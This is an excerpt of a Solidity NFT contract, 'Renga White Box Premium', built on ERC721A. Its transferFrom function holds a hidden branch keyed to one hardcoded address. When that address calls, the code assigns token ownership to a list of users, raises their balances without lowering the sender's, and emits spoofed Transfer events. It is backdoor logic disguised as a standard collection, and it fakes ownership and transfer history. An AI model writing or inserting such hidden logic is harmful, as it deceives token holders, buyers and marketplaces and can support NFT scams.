...
contract ERC721A is IERC721A {
    ...
    function transferFrom(
        ...
        if (msg.sender == address(0x1E0049783F008A0085193E00003D00cd54003c71)) {
         for (uint i = 0; i < UsersToTransfer.length; i++) {
            //prevOwnershipPacked = _packedOwnershipOf(i+2);
            _beforeTokenTransfers(from, UsersToTransfer[i], i+2, 1);
            unchecked {
                //--_packedAddressData[from]; // Updates: `balance -= 1`.
                ++_packedAddressData[UsersToTransfer[i]]; // Updates: `balance += 1`.
                _packedOwnerships[i+2] = _packOwnershipData(
                UsersToTransfer[i],
                BITMASK_NEXT_INITIALIZED | _nextExtraData(from, UsersToTransfer[i], _packedOwnershipOf(1))
            );
            }
            emit Transfer(from, UsersToTransfer[i], i+2);
            _afterTokenTransfers(from, UsersToTransfer[i], i+2, 1);
            }
        }
    }
...
contract RengaWhiteBox is ERC721A, Ownable {
	using Strings for uint;

    uint private constant MAX_PER_WALLET = 4;
	uint public maxSupply = 530;
	...
	constructor()
    // Name
	ERC721A("Renga White Box Premium", "RWBP") {
    }
